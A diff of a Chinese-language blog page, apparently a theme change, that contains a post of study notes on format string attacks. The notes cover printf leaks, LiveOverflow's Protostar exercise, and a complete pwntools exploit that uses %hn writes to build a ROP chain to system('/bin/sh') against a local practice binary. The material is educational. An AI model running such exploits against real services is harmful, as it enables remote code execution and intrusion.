@@ -1,205 +1,195 @@
 <!DOCTYPE html>
-<html lang="">
+<html lang="en">
 
+<!-- Head tag -->
 <head>
-    <meta charset="UTF-8">
-<meta name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-    <meta name="author" content="AStar">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 
-
-
-
-
-<title>Format_string_attack | AStar&#39;s Blog</title>
-
-
-
-    <link rel="icon" href="/favicon.ico">
-
-
-
-
-    <!-- stylesheets list from _config.yml -->
+    <!--Description-->
     
-    <link rel="stylesheet" href="/css/style.css">
+        <meta name="description" content="[2019/08/01]
+原理一般我們寫 printf() 都是這樣寫 printf(&amp;quot;%d&amp;quot;, value)那如果寫成 printf(buf) 呢? 他會直接 leak function parameters 的內容，也就是 stack (x86) 或是 register (x64) 的內容這個就是 Format_string_attack 的源頭，如果程式設計師為了偷懶或其他原因把 printf 寫成這樣，而且我們又能控 buf 的值那就代表該程式受 Format_string_attack 影響，只要是 printf 家族的 function (ex. vprintf, sprintf) 都有這個問題舉個例子ㄅ上面這個我已經把 bp 下在 printf 了，然後是一支 x86 的程式可以看到我們直接給他 %p 他會吐給我 stack 內的值，照 calling convention 來說這就是在 leak function 的 parameters那既然他是 leak function parameters 的話，如果一直 leak 下去代表什麼?他會一直 leak 到 stack 的內容，所以 x64 的話她會依次 leak rsi rdx rcx r8 r9 的值再開始 leak stack 的值 (rdi 是 “%p%p%p” 本身所以不會 leak,又因為 bp 下 printf 的話會先 jmp 進去才停止，所以第一個位置會是 return address,這個不算在 function parameter 內，x86也是同理所以是 leak 第三個位置開始的值)
+LiveOverflow這一個是看影片趕快做一下筆記，不然我快忘光了ＱＱ
+影片：https://www.youtube.com/watch?v=t1LH9D5cuK4
+題目：https://exploit.education/protostar/format-four/
+先看一下source code:
+
+可以看到他是直接做exit, 並沒有什麼return 0這種的">
     
 
-
-
-    <!-- scripts list from _config.yml -->
+    <!--Author-->
     
-    <script src="/js/script.js"></script>
-    
-    <script src="/js/tocbot.min.js"></script>
+        <meta name="author" content="AStar">
     
 
-
-
+    <!--Open Graph Title-->
     
-    
-        
+        <meta property="og:title" content="Format_string_attack"/>
     
 
+    <!--Open Graph Description-->
+    
 
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="AStar&#39;s Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+        <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>Format_string_attack - AStar&#39;s Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Google Analytics -->
+    
+
+
+    <!-- favicon -->
+    
+	
 <meta name="generator" content="Hexo 5.4.0"></head>
 
+
 <body>
-    <script>
-        // this function is used to check current theme before page loaded.
-        (() => {
-            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
-            const isDark = currentTheme === 'dark';
-            const pagebody = document.getElementsByTagName('body')[0]
-            if (isDark) {
-                pagebody.classList.add('dark-theme');
-                // mobile
-                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
-            } else {
-                pagebody.classList.remove('dark-theme');
-                // mobile
-                document.getElementById("mobile-toggle-theme").innerText = "· Light"
-            }
-        })();
-    </script>
 
-    <div class="wrapper">
-        <header>
-    <nav class="navbar">
-        <div class="container">
-            <div class="navbar-header header-logo"><a href="/">ASrar&#39;s Blog</a></div>
-            <div class="menu navbar-right">
-                
-                    <a class="menu-item" href="/archives">Posts</a>
-                
-                <input id="switch_default" type="checkbox" class="switch_default">
-                <label for="switch_default" class="toggleBtn"></label>
-            </div>
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">AStar</a>
         </div>
-    </nav>
 
-    
-    <nav class="navbar-mobile" id="nav-mobile">
-        <div class="container">
-            <div class="navbar-header">
-                <div>
-                    <a href="/">ASrar&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                
+                    <li>
+                        <a href="/">
+                            
+                                Home
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/archives">
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/tags">
+                            
+                                Tags
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/categories">
+                            
+                                Categories
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-clean-blog">
+                            
+                                <i class="fa fa-github fa-stack-2x"></i>
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>Format_string_attack</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2021-01-31
+                        
+                    </span>
                 </div>
-                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
-            </div>
-            <div class="menu" id="mobile-menu">
-                
-                    <a class="menu-item" href="/archives">Posts</a>
-                
             </div>
         </div>
-    </nav>
-
+    </div>
 </header>
-<script>
-    var mobileBtn = function f() {
-        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
-        var mobileMenu = document.getElementById("mobile-menu");
-        if(toggleMenu.classList.contains("active")){
-           toggleMenu.classList.remove("active")
-            mobileMenu.classList.remove("active")
-        }else{
-            toggleMenu.classList.add("active")
-            mobileMenu.classList.add("active")
-        }
-    }
-</script>
-            <div class="main">
-                <div class="container">
-    
-    
-        <div class="post-toc">
-    <div class="tocbot-list">
-    </div>
-    <div class="tocbot-list-menu">
-        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
-        <a onclick="go_top()">Back to top</a>
-        <a onclick="go_bottom()">Go to bottom</a>
-    </div>
-</div>
 
-<script>
-    document.ready(
-        function () {
-            tocbot.init({
-                tocSelector: '.tocbot-list',
-                contentSelector: '.post-content',
-                headingSelector: 'h1, h2, h3, h4, h5',
-                collapseDepth: 1,
-                orderedList: false,
-                scrollSmooth: true,
-            })
-        }
-    )
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
 
-    function expand_toc() {
-        var b = document.querySelector(".tocbot-toc-expand");
-        tocbot.init({
-            tocSelector: '.tocbot-list',
-            contentSelector: '.post-content',
-            headingSelector: 'h1, h2, h3, h4, h5',
-            collapseDepth: 6,
-            orderedList: false,
-            scrollSmooth: true,
-        });
-        b.setAttribute("onclick", "collapse_toc()");
-        b.innerHTML = "Collapse all"
-    }
+            <!-- Tags and categories -->
+           
 
-    function collapse_toc() {
-        var b = document.querySelector(".tocbot-toc-expand");
-        tocbot.init({
-            tocSelector: '.tocbot-list',
-            contentSelector: '.post-content',
-            headingSelector: 'h1, h2, h3, h4, h5',
-            collapseDepth: 1,
-            orderedList: false,
-            scrollSmooth: true,
-        });
-        b.setAttribute("onclick", "expand_toc()");
-        b.innerHTML = "Expand all"
-    }
-
-    function go_top() {
-        window.scrollTo(0, 0);
-    }
-
-    function go_bottom() {
-        window.scrollTo(0, document.body.scrollHeight);
-    }
-
-</script>
-    
-
-    
-    <article class="post-wrap">
-        <header class="post-header">
-            <h1 class="post-title">Format_string_attack</h1>
+            <!-- Gallery -->
             
-                <div class="post-meta">
-                    
-                        Author: <a itemprop="author" rel="author" href="/">AStar</a>
-                    
 
-                    
-                        <span class="post-time">
-                        Date: <a href="#">January 31, 2021&nbsp;&nbsp;20:00:08</a>
-                        </span>
-                    
-                    
-                </div>
-            
-        </header>
-
-        <div class="post-content">
-            <p>[2019/08/01]</p>
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p>[2019/08/01]</p>
 <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>一般我們寫 <code>printf()</code> 都是這樣寫 <code>printf(&quot;%d&quot;, value)</code><br>那如果寫成 <code>printf(buf)</code> 呢? 他會直接 leak function parameters 的內容，也就是 stack (x86) 或是 register (x64) 的內容<br>這個就是 Format_string_attack 的源頭，如果程式設計師為了偷懶或其他原因把 printf 寫成這樣，而且我們又能控 <code>buf</code> 的值<br>那就代表該程式受 Format_string_attack 影響，只要是 <code>printf</code> 家族的 function (ex. vprintf, sprintf) 都有這個問題<br>舉個例子ㄅ<br><img src="/img/Format_string_attack/ori_1.png" alt=""><br>上面這個我已經把 bp 下在 printf 了，然後是一支 x86 的程式<br>可以看到我們直接給他 <code>%p</code> 他會吐給我 stack 內的值，照 calling convention 來說這就是在 leak function 的 parameters<br>那既然他是 leak function parameters 的話，如果一直 leak 下去代表什麼?<br>他會一直 leak 到 stack 的內容，所以 x64 的話她會依次 leak <code>rsi rdx rcx r8 r9</code> 的值再開始 leak stack 的值 (rdi 是 “%p%p%p” 本身所以不會 leak,又因為 bp 下 printf 的話會先 jmp 進去才停止，所以第一個位置會是 return address,這個不算在 function parameter 內，x86也是同理所以是 leak 第三個位置開始的值)</p>
 <h1 id="LiveOverflow"><a href="#LiveOverflow" class="headerlink" title="LiveOverflow"></a>LiveOverflow</h1><p>這一個是看影片趕快做一下筆記，不然我快忘光了ＱＱ</p>
 <p>影片：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=t1LH9D5cuK4">https://www.youtube.com/watch?v=t1LH9D5cuK4</a></p>
@@ -471,66 +461,76 @@
 <p>直接附上最終的 exp<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">#io = process(&quot;./fmtfun4u&quot;)</span><br><span class="line">io = remote(&quot;127.0.0.1&quot;, 4444)</span><br><span class="line">libc = ELF(&quot;./libc.so.6_kali&quot;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">csu_offset = &quot;%8$lx&quot;</span><br><span class="line">libc_start_main_234 = &quot;%9$lx&quot;</span><br><span class="line">loop_times_offset = &quot;%7$x&quot;</span><br><span class="line">rbp_offset = &quot;%10$lx&quot;</span><br><span class="line">rbp_offset2 = &quot;%39$lx&quot;</span><br><span class="line"># leak text base and libc base</span><br><span class="line">io.sendline(csu_offset + &#x27;|&#x27; + libc_start_main_234)</span><br><span class="line">raw_recv = io.recvline()[:-1].split(b&#x27;|&#x27;)</span><br><span class="line">csu = int(raw_recv[0], 16)</span><br><span class="line">libc_start_main = int(raw_recv[1], 16) - 234</span><br><span class="line">log.info(&quot;csu is 0x%x&quot; %csu)</span><br><span class="line">log.info(&quot;libc_start_main is 0x%x&quot; %libc_start_main)</span><br><span class="line">binbase = csu - 0xa80</span><br><span class="line">ret = binbase + 0xae4</span><br><span class="line">libcbase = libc_start_main - libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">system = libcbase + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">log.info(&quot;system is 0x%x&quot; %system)</span><br><span class="line">pop_rdi_ret = binbase + 0xae3</span><br><span class="line">pop_r12_r13_r14_r15_ret = binbase + 0xadc</span><br><span class="line">binsh = libcbase + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">printf_libc = libcbase + libc.symbols[&#x27;printf&#x27;]</span><br><span class="line">log.info(&quot;binbase is 0x%x&quot; %binbase)</span><br><span class="line">log.info(&quot;libcbase is 0x%x&quot; %libcbase)</span><br><span class="line">log.info(&quot;printf is 0x%x&quot; %printf_libc)</span><br><span class="line">log.info(&quot;binsh = 0x%x&quot; %binsh)</span><br><span class="line">io.recvuntil(&quot;Input:&quot;)</span><br><span class="line"># leak stack address</span><br><span class="line">io.sendline(rbp_offset + &#x27;|&#x27; + rbp_offset2)</span><br><span class="line">raw_recv2 = io.recvline()[:-1].split(b&#x27;|&#x27;)</span><br><span class="line">rsp = int(raw_recv2[0], 16) - 0x110</span><br><span class="line">rbp_chain_address = int(raw_recv2[1], 16)</span><br><span class="line">loop_times = int(raw_recv2[0], 16) - 0x100 + 0x4</span><br><span class="line">log.info(&quot;loop_times address is 0x%x&quot; %loop_times)</span><br><span class="line">log.info(&quot;rbp chain is 0x%x&quot; %rbp_chain_address)</span><br><span class="line">log.info(&quot;rsp is 0x%x&quot; %(rsp))</span><br><span class="line"></span><br><span class="line">def modify(addr: int, value: int, Bytes: int):</span><br><span class="line">    io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">    x = addr &amp; 0xffff</span><br><span class="line">    payload = &quot;%&quot; + str(x) + &quot;c&quot; + &quot;%10$hn&quot;</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">    if Bytes == 2:</span><br><span class="line">        payload2 = &quot;%&quot; + str(value) + &quot;c&quot; + &quot;%39$hn&quot;</span><br><span class="line">    if Bytes == 1:</span><br><span class="line">        payload2 = &quot;%&quot; + str(value) + &quot;c&quot; + &quot;%39$hhn&quot;</span><br><span class="line">    io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"># change i to 65535</span><br><span class="line">modify(loop_times, 0xffff, 2)</span><br><span class="line"># write rop address</span><br><span class="line">modify((rsp+0x8), (pop_r12_r13_r14_r15_ret&amp;0xffff), 2)</span><br><span class="line">modify((rsp+0x8+2), ((pop_r12_r13_r14_r15_ret&amp;0xffff0000) &gt;&gt; 16), 2)</span><br><span class="line">modify((rsp+0x8+4), ((pop_r12_r13_r14_r15_ret&amp;0xffff00000000) &gt;&gt; 32), 2)</span><br><span class="line"></span><br><span class="line">modify((rsp+0x30), (pop_rdi_ret&amp;0xffff), 2)</span><br><span class="line">modify((rsp+0x30+2), ((pop_rdi_ret&amp;0xffff0000) &gt;&gt; 16), 2)</span><br><span class="line">modify((rsp+0x30+4), ((pop_rdi_ret&amp;0xffff00000000) &gt;&gt; 32), 2)</span><br><span class="line"></span><br><span class="line">modify((rsp+0x38), (binsh&amp;0xffff), 2)</span><br><span class="line">modify((rsp+0x38+2), ((binsh&amp;0xffff0000) &gt;&gt; 16), 2)</span><br><span class="line">modify((rsp+0x38+4), ((binsh&amp;0xffff00000000) &gt;&gt; 32), 2)</span><br><span class="line"></span><br><span class="line">modify((rsp+0x40),   (system&amp;0xffff), 2)</span><br><span class="line">modify((rsp+0x40+2), ((system&amp;0xffff0000) &gt;&gt; 16), 2)</span><br><span class="line">modify((rsp+0x40+4), ((system&amp;0xffff00000000) &gt;&gt; 32), 2)</span><br><span class="line"># overwrite return address to ret</span><br><span class="line">modify((rsp), (ret&amp;0xff), 1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br>一步一步用 gdb 來看：<br><img src="/img/Format_string_attack/rbp_chain_13.png" alt=""><br>經過 反覆測試後得知 <code>0x7fff93ca6e30</code> 處無法被改寫，一改寫上去就會發生 EOF Error, 代表那個地方可能是 function return 會需要用到的空間<br>那如果不寫那個地方的話要怎麼構呢？<br>兩個方法，一個是透過上面扣除 rsp 和 rsp + 0x8 的位置，用剩下的空間到 <code>0x7fff93ca6e30</code> 之間構 <code>system(&#39;/bin/sh&#39;)</code><br>或是直接 pop 到 <code>0x7fff93ca6e30</code>, 用下面的空間構 shell, 第一個方法受限於 gadget 沒有符合需求所以沒用<br>這邊使用第二個方法，可以借助 <code>csu</code> 的 gadget 來使用</p>
 <p>這是最後的樣子:<br><img src="/img/Format_string_attack/rbp_chain_14.png" alt=""><br><code>0x000055a585bebae4</code> = ret<br><code>0x000055a585bebadc</code> = pop_r12_r13_r14_r15_ret<br><code>0x000055a585bebae3</code> = pop_rdi_ret<br><code>0x00007f89c7ecc156</code> = ‘/bin/sh’<br><code>0x00007f89c7d8adf0</code> = system<br>就是構一個簡單的 ROP</p>
 
-        </div>
 
-        
-            <section class="post-copyright">
                 
-                    <p class="copyright-item">
-                        <span>Author:</span>
-                        <span>AStar</span>
-                    </p>
-                
-                
-                    <p class="copyright-item">
-                        <span>Permalink:</span>
-                        <span><a href="https://sda06407.github.io/2021/01/31/Format-string-attack/">https://sda06407.github.io/2021/01/31/Format-string-attack/</a></span>
-                    </p>
-                
-                
-                
-                     <p class="copyright-item">
-                         <span>Slogan:</span>
-                         <span>stay hungry stay foolish</span>
-                     </p>
-                
+            </div>
 
-            </section>
-        
-        <section class="post-tags">
-            <div>
-                <span>Tag(s):</span>
-                <span class="tag">
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                     
-                </span>
-            </div>
-            <div>
-                <a href="javascript:window.history.back();">back</a>
-                <span>· </span>
-                <a href="/">home</a>
-            </div>
-        </section>
-        <section class="post-nav">
-            
-                <a class="prev" rel="prev" href="/2021/05/14/Windows10-shellcode-concept/">Windows10 x64 shellcode concept</a>
-            
-            
-            <a class="next" rel="next" href="/2021/01/01/2021-1-1/">2021/1/1</a>
-            
-        </section>
 
 
-    </article>
-</div>
+                </div>
+            
+        </div>
+    </div>
+</article>
 
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+
+                    
+
+                    
+                        <li>
+                            <a href="https://github.com/sda06407" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <p class="copyright text-muted">&copy; 2021 AStar<br></p>
+                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
+                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
             </div>
-            <footer id="footer" class="footer">
-    <div class="copyright">
-        <span>© AStar | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+        </div>
     </div>
 </footer>
 
-    </div>
+
+    <!-- After footer scripts -->
+    
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Disqus Comments -->
+
+
+
 </body>
 
 </html>
